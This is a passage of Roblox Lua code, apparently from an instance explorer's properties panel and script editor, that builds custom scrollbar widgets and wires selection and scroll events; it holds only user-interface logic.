					BorderSizePixel = 0;
				});
			});
		})

		local graphicTemplate = Create('Frame',{
			Name="Graphic";
			BorderSizePixel = 0;
			BackgroundColor3 = Color3.new(1, 1, 1);
		})
		local graphicSize = ScrollBarWidth/2

		local ScrollDownFrame = ScrollFrame.ScrollDown
			local ScrollDownGraphic = ArrowGraphic(graphicSize,horizontal and 'Right' or 'Down',true,graphicTemplate)
			ScrollDownGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollDownGraphic.Parent = ScrollDownFrame
		local ScrollUpFrame = ScrollFrame.ScrollUp
			local ScrollUpGraphic = ArrowGraphic(graphicSize,horizontal and 'Left' or 'Up',true,graphicTemplate)
			ScrollUpGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollUpGraphic.Parent = ScrollUpFrame
		local ScrollBarFrame = ScrollFrame.ScrollBar
		local ScrollThumbFrame = ScrollBarFrame.ScrollThumb
		do
			local size = ScrollBarWidth*3/8
			local Decal = GripGraphic(Vector2.new(size,size),horizontal and 'Vertical' or 'Horizontal',2,graphicTemplate)
			Decal.Position = UDim2.new(0.5,-size/2,0.5,-size/2)
			Decal.Parent = ScrollThumbFrame
		end

		local MouseDrag = Create('ImageButton',{
			Name = "MouseDrag";
			Position = UDim2.new(-0.25,0,-0.25,0);
			Size = UDim2.new(1.5,0,1.5,0);
			Transparency = 1;
			AutoButtonColor = false;
			Active = true;
			ZIndex = 10;
		})

		local Class = setmetatable({
			GUI = ScrollFrame;
			ScrollIndex = 0;
			VisibleSpace = 0;
			TotalSpace = 0;
			PageIncrement = 1;
		},mt)

		local UpdateScrollThumb
		if horizontal then
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(Class.VisibleSpace/Class.TotalSpace,0,0,ScrollBarWidth)
				if ScrollThumbFrame.AbsoluteSize.x < ScrollBarWidth then
					ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.x
				ScrollThumbFrame.Position = UDim2.new(Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.x)/barSize,0,0,0)
			end
		else
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,Class.VisibleSpace/Class.TotalSpace,0)
				if ScrollThumbFrame.AbsoluteSize.y < ScrollBarWidth then
					ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.y
				ScrollThumbFrame.Position = UDim2.new(0,0,Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.y)/barSize,0)
			end
		end

		local lastDown
		local lastUp
		local scrollStyle = {BackgroundColor3=Color3.new(1, 1, 1),BackgroundTransparency=0}
		local scrollStyle_ds = {BackgroundColor3=Color3.new(1, 1, 1),BackgroundTransparency=0.7}

		local function Update()
			local t = Class.TotalSpace
			local v = Class.VisibleSpace
			local s = Class.ScrollIndex
			if v <= t then
				if s > 0 then
					if s + v > t then
						Class.ScrollIndex = t - v
					end
				else
					Class.ScrollIndex = 0
				end
			else
				Class.ScrollIndex = 0
			end

			if Class.UpdateCallback then
				if Class.UpdateCallback(Class) == false then
					return
				end
			end

			local down = Class:CanScrollDown()
			local up = Class:CanScrollUp()
			if down ~= lastDown then
				lastDown = down
				ScrollDownFrame.Active = down
				ScrollDownFrame.AutoButtonColor = down
				local children = ScrollDownGraphic:GetChildren()
				local style = down and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			if up ~= lastUp then
				lastUp = up
				ScrollUpFrame.Active = up
				ScrollUpFrame.AutoButtonColor = up
				local children = ScrollUpGraphic:GetChildren()
				local style = up and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			ScrollThumbFrame.Visible = down or up
			UpdateScrollThumb()
		end
		Class.Update = Update

		SetZIndexOnChanged(ScrollFrame)

		local scrollEventID = 0
		ScrollDownFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollDownFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollDown()
			wait(0.2) -- delay before auto scroll
			while scrollEventID == current do
				Class:ScrollDown()
				if not Class:CanScrollDown() then break end
				wait()
			end
		end)

		ScrollDownFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		ScrollUpFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollUpFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollUp()
			wait(0.2)
			while scrollEventID == current do
				Class:ScrollUp()
				if not Class:CanScrollUp() then break end
				wait()
			end
		end)

		ScrollUpFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		if horizontal then
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if x > ScrollThumbFrame.AbsolutePosition.x then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x < ScrollThumbFrame.AbsolutePosition.x + ScrollThumbFrame.AbsoluteSize.x then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x > ScrollThumbFrame.AbsolutePosition.x then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		else
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if y > ScrollThumbFrame.AbsolutePosition.y then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y < ScrollThumbFrame.AbsolutePosition.y + ScrollThumbFrame.AbsoluteSize.y then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y > ScrollThumbFrame.AbsolutePosition.y then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		end

		if horizontal then
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = x - ScrollThumbFrame.AbsolutePosition.x
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					if not UserInputService:IsMouseButtonPressed'MouseButton1' then
						scrollEventID = tick()
						MouseDrag.Parent = nil
						ResetButtonColor(ScrollThumbFrame)
						drag_con:disconnect(); drag_con = nil
						up_con:disconnect(); drag = nil
					end
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.x
					local bar_drag = ScrollBarFrame.AbsoluteSize.x - ScrollThumbFrame.AbsoluteSize.x
					local bar_abs_one = bar_abs_pos + bar_drag
					x = x - mouse_offset
					x = x < bar_abs_pos and bar_abs_pos or x > bar_abs_one and bar_abs_one or x
					x = x - bar_abs_pos
					Class:SetScrollPercent(x/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		else
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = y - ScrollThumbFrame.AbsolutePosition.y
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					if not UserInputService:IsMouseButtonPressed'MouseButton1' then
						scrollEventID = tick()
						MouseDrag.Parent = nil
						ResetButtonColor(ScrollThumbFrame)
						drag_con:disconnect(); drag_con = nil
						up_con:disconnect(); drag = nil
					end
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.y
					local bar_drag = ScrollBarFrame.AbsoluteSize.y - ScrollThumbFrame.AbsoluteSize.y
					local bar_abs_one = bar_abs_pos + bar_drag
					y = y - mouse_offset
					y = y < bar_abs_pos and bar_abs_pos or y > bar_abs_one and bar_abs_one or y
					y = y - bar_abs_pos
					Class:SetScrollPercent(y/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		end

		function Class:Destroy()
			ScrollFrame:Destroy()
			MouseDrag:Destroy()
			for k in pairs(Class) do
				Class[k] = nil
			end
			setmetatable(Class,nil)
		end

		Update()

		return Class
	end
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(1, -1 * ScrollBarWidth, 1, 0)
MainFrame.Position = UDim2.new(0, 0, 0, 0)
MainFrame.BackgroundTransparency = 1
MainFrame.ClipsDescendants = true
MainFrame.Parent = PropertiesFrame

ContentFrame = Instance.new("Frame")
ContentFrame.Name = "ContentFrame"
ContentFrame.Size = UDim2.new(1, 0, 0, 0)
ContentFrame.BackgroundTransparency = 1
ContentFrame.Parent = MainFrame

scrollBar = ScrollBar(false)
scrollBar.PageIncrement = 1
Create(scrollBar.GUI,{
	Position = UDim2.new(1,-ScrollBarWidth,0,0);
	Size = UDim2.new(0,ScrollBarWidth,1,0);
	Parent = PropertiesFrame;
})

scrollBarH = ScrollBar(true)
scrollBarH.PageIncrement = ScrollBarWidth
Create(scrollBarH.GUI,{
	Position = UDim2.new(0,0,1,-ScrollBarWidth);
	Size = UDim2.new(1,-ScrollBarWidth,0,ScrollBarWidth);
	Visible = false;
	Parent = PropertiesFrame;
})

do
	local listEntries = {}
	local nameConnLookup = {}
	
	function scrollBar.UpdateCallback(self)
		scrollBar.TotalSpace = ContentFrame.AbsoluteSize.Y
		scrollBar.VisibleSpace = MainFrame.AbsoluteSize.Y
		ContentFrame.Position = UDim2.new(ContentFrame.Position.X.Scale,ContentFrame.Position.X.Offset,0,-1*scrollBar.ScrollIndex)
	end

	function scrollBarH.UpdateCallback(self)
		
	end

	MainFrame.Changed:connect(function(p)
		if p == 'AbsoluteSize' then
			scrollBarH.VisibleSpace = math.ceil(MainFrame.AbsoluteSize.x)
			scrollBarH:Update()
			scrollBar.VisibleSpace = math.ceil(MainFrame.AbsoluteSize.y)
			scrollBar:Update()
		end
	end)

	local wheelAmount = Row.Height
	PropertiesFrame.MouseWheelForward:connect(function()
		if input ~= nil and input.down ~= nil and input.down.leftshift then
			if scrollBarH.VisibleSpace - 1 > wheelAmount then
				scrollBarH:ScrollTo(scrollBarH.ScrollIndex - wheelAmount)
			else
				scrollBarH:ScrollTo(scrollBarH.ScrollIndex - scrollBarH.VisibleSpace)
			end
		else
			if scrollBar.VisibleSpace - 1 > wheelAmount then
				scrollBar:ScrollTo(scrollBar.ScrollIndex - wheelAmount)
			else
				scrollBar:ScrollTo(scrollBar.ScrollIndex - scrollBar.VisibleSpace)
			end
		end
	end)
	PropertiesFrame.MouseWheelBackward:connect(function()
		if input ~= nil and input.down ~= nil and input.down.leftshift then
			if scrollBarH.VisibleSpace - 1 > wheelAmount then
				scrollBarH:ScrollTo(scrollBarH.ScrollIndex + wheelAmount)
			else
				scrollBarH:ScrollTo(scrollBarH.ScrollIndex + scrollBarH.VisibleSpace)
			end
		else
			if scrollBar.VisibleSpace - 1 > wheelAmount then
				scrollBar:ScrollTo(scrollBar.ScrollIndex + wheelAmount)
			else
				scrollBar:ScrollTo(scrollBar.ScrollIndex + scrollBar.VisibleSpace)
			end
		end
	end)
end

scrollBar.VisibleSpace = math.ceil(MainFrame.AbsoluteSize.y)
scrollBar:Update()

showProperties(GetSelection())

bindSelectionChanged.Event:connect(function()
	showProperties(GetSelection())
end)

bindSetAwait.Event:connect(function(obj)
	if AwaitingObjectValue then
		AwaitingObjectValue = false
		local mySel = obj
		if mySel then
			pcall(function()
				Set(AwaitingObjectObj, AwaitingObjectProp, mySel)
			end)
		end
	end
end)

propertiesSearch.Changed:connect(function(prop)
	if prop == "Text" then
		showProperties(GetSelection())
	end
end)

bindGetApi.OnInvoke = function()
	return RbxApi
end

bindGetAwait.OnInvoke = function()
	return AwaitingObjectValue
end
end)
spawn(function()

local top = D_E_X.ScriptEditor

local editorGrid = top:WaitForChild("EditorGrid")

local currentSource = ""
local currentScrName = "";

local currentEditor = {
	x = 0,
	y = 0
}

local mouse = game:GetService'Players'.LocalPlayer:GetMouse()

local topBar = top:WaitForChild("TopBar")
local scriptBar = topBar:WaitForChild("ScriptBar")
local scriptBarLeft = topBar:WaitForChild("ScriptBarLeft")
local scriptBarRight = topBar:WaitForChild("ScriptBarRight")
local clipboardButton = topBar:WaitForChild("Clipboard")
local saveScriptButton = topBar:FindFirstChild("SaveScript")

local entryTemplate = topBar:WaitForChild("Entry")

local openEvent = top:WaitForChild("OpenScript")

local closeButton = top:WaitForChild("Close")

local memoryScripts = {}

local editingIndex = 0

-- Scrollbar

local ScrollBarWidth = 16

local ScrollStyles = {
	Background      = Color3.fromRGB(233, 233, 233);
	Border          = Color3.fromRGB( 20,  20,  20);
	Selected        = Color3.fromRGB( 63, 119, 189);
	BorderSelected  = Color3.fromRGB( 55, 106, 167);
	Text            = Color3.fromRGB(  0,   0,   0);
	TextDisabled    = Color3.fromRGB(128, 128, 128);
	TextSelected    = Color3.fromRGB(255, 255, 255);
	Button          = Color3.fromRGB( 35,  35,  35);
	ButtonBorder    = Color3.fromRGB(149, 149, 149);
	ButtonSelected  = Color3.fromRGB(255,   0,   0);
	Field           = Color3.fromRGB(255, 255, 255);
	FieldBorder     = Color3.fromRGB(191, 191, 191);
	TitleBackground = Color3.fromRGB(178, 178, 178);
}
do
	local ZIndexLock = {}
	function SetZIndex(object,z)
		if not ZIndexLock[object] then
			ZIndexLock[object] = true
			if object:IsA'GuiObject' then
				object.ZIndex = z
			end
			local children = object:GetChildren()
			for i = 1,#children do
				SetZIndex(children[i],z)
			end
			ZIndexLock[object] = nil
		end
	end
end
function SetZIndexOnChanged(object)
	return object.Changed:connect(function(p)
		if p == "ZIndex" then
			SetZIndex(object,object.ZIndex)
		end
	end)
end
function Create(ty,data)
	local obj
	if type(ty) == 'string' then
		obj = Instance.new(ty)
	else
		obj = ty
	end
	for k, v in pairs(data) do
		if type(k) == 'number' then
			v.Parent = obj
		else
			obj[k] = v
		end
	end
	return obj
end
-- returns the ascendant ScreenGui of an object
function GetScreen(screen)
	if screen == nil then return nil end
	while not screen:IsA("ScreenGui") do
		screen = screen.Parent
		if screen == nil then return nil end
	end
	return screen
end
-- AutoButtonColor doesn't always reset properly
function ResetButtonColor(button)
	local active = button.Active
	button.Active = not active
	button.Active = active
end

function ArrowGraphic(size,dir,scaled,template)
	local Frame = Create('Frame',{
		Name = "Arrow Graphic";
		BorderSizePixel = 0;
		Size = UDim2.new(0,size,0,size);
		Transparency = 1;
	})
	if not template then
		template = Instance.new("Frame")
		template.BorderSizePixel = 0
	end

	template.BackgroundColor3 = Color3.new(1, 1, 1);

	local transform
	if dir == nil or dir == 'Up' then
		function transform(p,s) return p,s end
	elseif dir == 'Down' then
		function transform(p,s) return UDim2.new(0,p.X.Offset,0,size-p.Y.Offset-1),s end
	elseif dir == 'Left' then 
		function transform(p,s) return UDim2.new(0,p.Y.Offset,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
	elseif dir == 'Right' then
		function transform(p,s) return UDim2.new(0,size-p.Y.Offset-1,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
	end

	local scale
	if scaled then
		function scale(p,s) return UDim2.new(p.X.Offset/size,0,p.Y.Offset/size,0),UDim2.new(s.X.Offset/size,0,s.Y.Offset/size,0) end
	else
		function scale(p,s) return p,s end
	end

	local o = math.floor(size/4)
	if size%2 == 0 then
		local n = size/2-1
		for i = 0,n do
			local t = template:Clone()
			local p,s = scale(transform(
				UDim2.new(0,n-i,0,o+i),
				UDim2.new(0,(i+1)*2,0,1)
			))
			t.Position = p
			t.Size = s
			t.Parent = Frame
		end
	else
		local n = (size-1)/2
		for i = 0,n do
			local t = template:Clone()
			local p,s = scale(transform(
				UDim2.new(0,n-i,0,o+i),
				UDim2.new(0,i*2+1,0,1)
			))
			t.Position = p
			t.Size = s
			t.Parent = Frame
		end
	end
	if size%4 > 1 then
		local t = template:Clone()
		local p,s = scale(transform(
			UDim2.new(0,0,0,size-o-1),
			UDim2.new(0,size,0,1)
		))
		t.Position = p
		t.Size = s
		t.Parent = Frame
	end

	for i,v in pairs(Frame:GetChildren()) do
		v.BackgroundColor3 = Color3.new(1, 1, 1);
	end

	return Frame
end

function GripGraphic(size,dir,spacing,scaled,template)
	local Frame = Create('Frame',{
		Name = "Grip Graphic";
		BorderSizePixel = 0;
		Size = UDim2.new(0,size.x,0,size.y);
		Transparency = 1;
	})
	if not template then
		template = Instance.new("Frame")
		template.BorderSizePixel = 0
	end

	spacing = spacing or 2

	local scale
	if scaled then
		function scale(p) return UDim2.new(p.X.Offset/size.x,0,p.Y.Offset/size.y,0) end
	else
		function scale(p) return p end
	end

	if dir == 'Vertical' then
		for i=0,size.x-1,spacing do
			local t = template:Clone()
			t.Size = scale(UDim2.new(0,1,0,size.y))
			t.Position = scale(UDim2.new(0,i,0,0))
			t.Parent = Frame
		end
	elseif dir == nil or dir == 'Horizontal' then
		for i=0,size.y-1,spacing do
			local t = template:Clone()
			t.Size = scale(UDim2.new(0,size.x,0,1))
			t.Position = scale(UDim2.new(0,0,0,i))
			t.Parent = Frame
		end
	end

	return Frame
end

do
	local mt = {
		__index = {
			GetScrollPercent = function(self)
				return self.ScrollIndex/(self.TotalSpace-self.VisibleSpace)
			end;
			CanScrollDown = function(self)
				return self.ScrollIndex + self.VisibleSpace < self.TotalSpace
			end;
			CanScrollUp = function(self)
				return self.ScrollIndex > 0
			end;
			ScrollDown = function(self)
				self.ScrollIndex = self.ScrollIndex + self.PageIncrement
				self:Update()
			end;
			ScrollUp = function(self)
				self.ScrollIndex = self.ScrollIndex - self.PageIncrement
				self:Update()
			end;
			ScrollTo = function(self,index)
				self.ScrollIndex = index
				self:Update()
			end;
			SetScrollPercent = function(self,percent)
				self.ScrollIndex = math.floor((self.TotalSpace - self.VisibleSpace)*percent + 0.5)
				self:Update()
			end;
		};
	}
	mt.__index.CanScrollRight = mt.__index.CanScrollDown
	mt.__index.CanScrollLeft = mt.__index.CanScrollUp
	mt.__index.ScrollLeft = mt.__index.ScrollUp
	mt.__index.ScrollRight = mt.__index.ScrollDown

	function ScrollBar(horizontal)
		-- create row scroll bar
		local ScrollFrame = Create('Frame',{
			Name = "ScrollFrame";
			Position = horizontal and UDim2.new(0,0,1,-ScrollBarWidth) or UDim2.new(1,-ScrollBarWidth,0,0);
			Size = horizontal and UDim2.new(1,0,0,ScrollBarWidth) or UDim2.new(0,ScrollBarWidth,1,0);
			BackgroundTransparency = 1;
			Create('ImageButton',{
				Name = "ScrollDown";
				Position = horizontal and UDim2.new(1,-ScrollBarWidth,0,0) or UDim2.new(0,0,1,-ScrollBarWidth);
				Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
				BackgroundColor3 = ScrollStyles.Button;
				BorderColor3 = ScrollStyles.Border;
				BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollUp";
				Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
				BackgroundColor3 = ScrollStyles.Button;
				BorderColor3 = ScrollStyles.Border;
				BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollBar";
				Size = horizontal and UDim2.new(1,-ScrollBarWidth*2,1,0) or UDim2.new(1,0,1,-ScrollBarWidth*2);
				Position = horizontal and UDim2.new(0,ScrollBarWidth,0,0) or UDim2.new(0,0,0,ScrollBarWidth);
				AutoButtonColor = false;
				BackgroundColor3 = Color3.fromRGB(20, 20, 20);
				BorderColor3 = ScrollStyles.Border;
				BorderSizePixel = 0;
				Create('ImageButton',{
					Name = "ScrollThumb";
					AutoButtonColor = false;
					Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
					BackgroundColor3 = ScrollStyles.Button;
					BorderColor3 = ScrollStyles.Border;
					BorderSizePixel = 0;
				});
			});
		})

		local graphicTemplate = Create('Frame',{
			Name="Graphic";
			BorderSizePixel = 0;
			BackgroundColor3 = Color3.new(1, 1, 1);
		})
		local graphicSize = ScrollBarWidth/2

		local ScrollDownFrame = ScrollFrame.ScrollDown
			local ScrollDownGraphic = ArrowGraphic(graphicSize,horizontal and 'Right' or 'Down',true,graphicTemplate)
			ScrollDownGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollDownGraphic.Parent = ScrollDownFrame
		local ScrollUpFrame = ScrollFrame.ScrollUp
			local ScrollUpGraphic = ArrowGraphic(graphicSize,horizontal and 'Left' or 'Up',true,graphicTemplate)
			ScrollUpGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollUpGraphic.Parent = ScrollUpFrame
		local ScrollBarFrame = ScrollFrame.ScrollBar
		local ScrollThumbFrame = ScrollBarFrame.ScrollThumb
		do
			local size = ScrollBarWidth*3/8
			local Decal = GripGraphic(Vector2.new(size,size),horizontal and 'Vertical' or 'Horizontal',2,graphicTemplate)
			Decal.Position = UDim2.new(0.5,-size/2,0.5,-size/2)
			Decal.Parent = ScrollThumbFrame
		end

		local MouseDrag = Create('ImageButton',{
			Name = "MouseDrag";
			Position = UDim2.new(-0.25,0,-0.25,0);
			Size = UDim2.new(1.5,0,1.5,0);
			Transparency = 1;
			AutoButtonColor = false;
			Active = true;
			ZIndex = 10;
		})

		local Class = setmetatable({
			GUI = ScrollFrame;
			ScrollIndex = 0;
			VisibleSpace = 0;
			TotalSpace = 0;
			PageIncrement = 1;
		},mt)

		local UpdateScrollThumb
		if horizontal then
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(Class.VisibleSpace/Class.TotalSpace,0,0,ScrollBarWidth)
				if ScrollThumbFrame.AbsoluteSize.x < ScrollBarWidth then
					ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.x
				ScrollThumbFrame.Position = UDim2.new(Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.x)/barSize,0,0,0)
			end
		else
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,Class.VisibleSpace/Class.TotalSpace,0)
				if ScrollThumbFrame.AbsoluteSize.y < ScrollBarWidth then
					ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.y
				ScrollThumbFrame.Position = UDim2.new(0,0,Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.y)/barSize,0)
			end
		end

		local lastDown
		local lastUp
		local scrollStyle = {BackgroundColor3=Color3.new(1, 1, 1),BackgroundTransparency=0}
		local scrollStyle_ds = {BackgroundColor3=Color3.new(1, 1, 1),BackgroundTransparency=0.7}

		local function Update()
			local t = Class.TotalSpace
			local v = Class.VisibleSpace
			local s = Class.ScrollIndex
			if v <= t then
				if s > 0 then
					if s + v > t then
						Class.ScrollIndex = t - v
					end
				else
					Class.ScrollIndex = 0
				end
			else
				Class.ScrollIndex = 0
			end

			if Class.UpdateCallback then
				if Class.UpdateCallback(Class) == false then
					return
				end
			end

			local down = Class:CanScrollDown()
			local up = Class:CanScrollUp()
			if down ~= lastDown then
				lastDown = down
				ScrollDownFrame.Active = down
				ScrollDownFrame.AutoButtonColor = down
				local children = ScrollDownGraphic:GetChildren()
				local style = down and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			if up ~= lastUp then
				lastUp = up
				ScrollUpFrame.Active = up
				ScrollUpFrame.AutoButtonColor = up
				local children = ScrollUpGraphic:GetChildren()
				local style = up and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			ScrollThumbFrame.Visible = down or up
			UpdateScrollThumb()
		end
		Class.Update = Update

		SetZIndexOnChanged(ScrollFrame)

		local scrollEventID = 0
		ScrollDownFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollDownFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollDown()
			wait(0.2) -- delay before auto scroll
			while scrollEventID == current do
				Class:ScrollDown()
				if not Class:CanScrollDown() then break end
				wait()
			end
		end)

		ScrollDownFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		ScrollUpFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollUpFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollUp()
			wait(0.2)
			while scrollEventID == current do
				Class:ScrollUp()
				if not Class:CanScrollUp() then break end
				wait()
			end
		end)

		ScrollUpFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		if horizontal then
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if x > ScrollThumbFrame.AbsolutePosition.x then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x < ScrollThumbFrame.AbsolutePosition.x + ScrollThumbFrame.AbsoluteSize.x then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x > ScrollThumbFrame.AbsolutePosition.x then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		else
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if y > ScrollThumbFrame.AbsolutePosition.y then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y < ScrollThumbFrame.AbsolutePosition.y + ScrollThumbFrame.AbsoluteSize.y then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y > ScrollThumbFrame.AbsolutePosition.y then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		end

		if horizontal then
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = x - ScrollThumbFrame.AbsolutePosition.x
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					if not UserInputService:IsMouseButtonPressed'MouseButton1' then
						scrollEventID = tick()
						MouseDrag.Parent = nil
						ResetButtonColor(ScrollThumbFrame)
						drag_con:disconnect(); drag_con = nil
						up_con:disconnect(); drag = nil
					end
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.x
					local bar_drag = ScrollBarFrame.AbsoluteSize.x - ScrollThumbFrame.AbsoluteSize.x
					local bar_abs_one = bar_abs_pos + bar_drag
					x = x - mouse_offset
					x = x < bar_abs_pos and bar_abs_pos or x > bar_abs_one and bar_abs_one or x
					x = x - bar_abs_pos
					Class:SetScrollPercent(x/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
